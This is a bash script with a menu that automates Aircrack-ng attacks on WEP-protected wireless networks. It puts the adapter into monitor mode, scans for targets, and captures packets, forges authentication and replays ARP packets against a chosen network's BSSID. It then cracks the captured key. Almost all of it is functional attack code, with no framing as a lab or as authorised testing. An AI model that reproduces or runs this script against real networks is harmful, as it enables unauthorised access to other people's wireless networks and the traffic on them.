#!/bin/bash
#title           :wepcracker.sh
#description     :This is a script to automate Aircrack-ng against WEP networks.
#author		 :Seth Bare
#date            :20141110
#version         :0.3   
#usage		 :Place in /usr/local/bin set to executable.  Call from a terminal with ./wepcracker.sh
#notes           :This is under constant work.  
#bash_version    :4.1.5(1)-release
#Licensing	 Licensed under the GNU GPL V 3.0
#

############ Variables ####################
RED=$(tput setaf 1 && tput bold)
GREEN=$(tput setaf 2 && tput bold)
STAND=$(tput sgr0)
BLUE=$(tput setaf 6 && tput bold)

############## Begin script loop ########################

read -p $GREEN"What do you want to name this attack session?" dname
#########################################################
while :
do

########################## Start:  Detect Mon0 and display networking status ######

mon0mac=$(ip addr | grep "radiotap" | cut -c 30-46)

if [ -s $mon0mac ]
then
   MonitorModeStatus=$(echo Networking Mode Is Enabled)
else
   MonitorModeStatus=$(echo Attack Mode Is Enabled)

fi
######################### End:  Detect Mon0 and display networking status ############


   mkdir -p $HOME/Desktop/aircracker/$dname

clear
echo $RED"#########################################"
echo "#   $STAND         Aircracker          $RED#"
echo "#########################################"
echo "#                                       #"
echo "#$GREEN [1]$BLUE Interface Selection               $RED#"
echo "#$GREEN [2]$BLUE System Mode Selection             $RED#"
echo "#$GREEN [3]$BLUE Scan For Target Networks $RED         #"
echo "#$GREEN [4]$BLUE Attack Target Networks        $RED    #"
echo "#$GREEN [5]$BLUE Crack the Password    $RED            #"
echo "#$GREEN [6]$BLUE Exit  $RED                            #"
echo "#                                       #"
echo "#########################################"
echo ""
echo $RED"Chosen Interface$STAND: $wlanX"
echo $RED"System Mode$STAND: $MonitorModeStatus"
echo $RED"MAC address for mon0$STAND: $mon0mac"
echo $RED"Target Network:$STAND $essid"
echo $RED"Target Network MAC:$STAND $bssid"
echo $RED"Target Network Channel:$STAND $channel"
echo ""
read -p $GREEN"Please choose an option?$STAND:" ChosenOption
echo 
case $ChosenOption in

########################## Start:  Display available wireless interfaces #############

1)

clear
wifi_adapters=$(airmon-ng | grep "wlan" | awk '{ print $1 }' | nl -ba -w 1 -s ': ')
echo $RED"Available WiFi Adapters."
echo "########################"$STAND
echo ""
echo "$wifi_adapters"
echo $RED "$MonitorModeStatus"
echo ""
read -p " Type the interface you wish to use:" wlanX
;;

######################### End:  Display available wireless interfaces ################ 

######################### Start: Select networking mode. #############################

2)

clear
echo $RED"What system mode would you like to set."
echo $GREEN"[1]$BLUE = Put The System Into Networking Mode."
echo $GREEN"[2]$BLUE = Put The System Into Monitor Mode."
echo $GREEN"[3]$BLUE = Return To Menu."
read -p $GREEN"1,2, or 3?:$STAND " option

######################### Start: OPTION1 Networking mode selection ##########################

if [[ $option == "1" ]]; then
   airmon-ng stop mon5
   airmon-ng stop mon4
   airmon-ng stop mon3
   airmon-ng stop mon2
   airmon-ng stop mon1
   airmon-ng stop mon0
   airmon-ng stop $wlanX 
   ifconfig $wlanX down
   ifconfig $wlanX | grep HWaddr
   ifconfig $wlanX up
   service network-manager start
   echo $RED"Press enter to continue"
   read x
fi

##################### End: OPTION1 networking mode selection #################################

##################### Start:  OPTION 2 attack mode selection #################################

if [[ $option == "2" ]]; then
   clear
   read -p $GREEN"Would you like to disable processes that might cause issues y/n?:$STAND " processes
   if [[ $processes == "Y" || $processes == "y" ]]; then
      echo ""
      read -p $GREEN"Would you like to disable NetworkManager y/n?:$STAND " NetworkManager
      if [[ $NetworkManager == "Y" || $NetworkManager == "y" ]]; then
         echo ""
         killall -q NetworkManager             
      fi
      read -p $GREEN"Would you like to disable wpa_supplicant y/n?:$STAND " WPAsupplicant
      if [[ $WPAsupplicant == "Y" || $WPAsupplicant == "y" ]]; then
         echo ""
         killall -q wpa_supplicant               
      fi                
   fi
   sleep 1
   clear
   airmon-ng start $wlanX
   ifconfig $wlanX down
   ifconfig mon0 down
   ifconfig $wlanX up
   ifconfig mon0 up
fi

################### End: OPTION 2 attack mode selection ########################################

################### START:OPTION 3 Return To Menu ##############################################

if [[ $option == "3" ]]; then
   echo $RED"Returning to menu...$STAND"
fi

################## END:OPTION 3 Return To Menu #################################################
;;

################# Start:  Scan for Target Networks #############################################

3) 

clear
read -p $GREEN"Press [Enter] to begin scanning for target networks.  Record all pertinent data and then close the window with CTRL+C.$STAND"
cd /root/Desktop/aircracker/$dname
#xterm -geometry 111x24+650+0 -e airodump-ng -t wep mon0
gnome-terminal -e "bash -c 'airodump-ng -t wep mon0'"
read -p $GREEN"What is name of the target network? :" essid
read -p $GREEN"What is the MAC address of your target network? :" bssid
read -p $GREEN"What channel is the target network on?" channel
echo "Ensure you close the airodump window before executing option 4"
sleep 4
clear
echo $RED"Please wait..."$STAND
sleep 1
echo ""  
;;

########### Begin [4] attack target network. ##################################

4)

clear 
read -p $GREEN"Press [Enter] to launch attacks against the choosen network.  Let this run until there is 100K data packs."
#xterm -geometry 111x24+650+0 -hold -e airodump-ng -c $channel --bssid $bssid -w $dname mon0 &
#xterm -geometry 111x24+650+0 -hold -e aireplay-ng -1 0 -e $essid -a $bssid -h $mon0mac --ignore-negative-one mon0 &
#xterm -geometry 111x24+650+0 -hold -e aireplay-ng -3 -b $bssid -h $mon0mac --ignore-negative-one mon0
gnome-terminal --tab --profile hold -e "bash -c 'airodump-ng -c $channel --bssid $bssid -w $dname mon0'" &
gnome-terminal --tab --profile hold -e "bash -c 'aireplay-ng -1 0 -e $essid -a $bssid -h $mon0mac --ignore-negative-one mon0'" &
gnome-terminal --tab --profile hold -e "bash -c 'aireplay-ng -3 -b $bssid -h $mon0mac --ignore-negative-one mon0'"

wait 10
;;
################ End [4] attack target network. ###############################

############### Start [5] Crack the password. #################################
5)
read -p $GREEN"Press [Enter] to crack the password.  If this doesn't work rerun option 4."
gnome-terminal --profile hold -e "bash -c 'aircrack-ng -b $bssid $HOME/Desktop/aircracker/$dname/$dname*.cap'"
echo ""
;;

############### End [5] crack the password. ###################################
############### Start [6] exit ################################################
6)
clear
echo $RED"Closing the program."
sleep 5
exit
;;
############## End [6] exit #####################################################
esac
done

